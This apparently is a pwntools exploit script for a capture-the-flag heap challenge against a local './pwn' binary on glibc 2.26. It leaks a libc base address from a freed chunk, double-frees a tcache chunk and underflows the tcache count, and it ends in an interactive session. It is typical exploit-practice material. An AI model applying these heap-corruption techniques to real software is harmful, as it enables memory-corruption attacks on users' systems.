from pwn import *

elf = ELF("./pwn")
libc = ELF("/home/zsy/pwn/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc-2.26.so")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)
# pause()

# 泄露libc地址
add_chunk(0, 0x410)
add_chunk(1, 0x20)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)

p.recvline()
# tmp = u64(p.recvuntil(b'\x7f').ljust(0x8, b'\x00'))
# print(f"tmp = {hex(tmp)}")
libc.address = u64(p.recvuntil(b'\x7f').ljust(0x8, b'\x00')) - 0x3dac78
print(f"libc.address = {hex(libc.address)}")

add_chunk(2, 0x20)
add_chunk(3, 0x20)

delete_chunk(2) # -> tcache->counts[0x30] == 1
delete_chunk(2) # -> tcache->counts[0x30] == 2

add_chunk(2, 0x20) # -> tcache->counts[0x30] == 1
add_chunk(2, 0x20) # -> tcache->counts[0x30] == 0
add_chunk(2, 0x20) # -> tcache->counts[0x30] == -1
add_chunk(2, 0x20) # -> tcache->counts[0x30] == -2
add_chunk(2, 0x20) # -> tcache->counts[0x30] == -3

p.interactive()
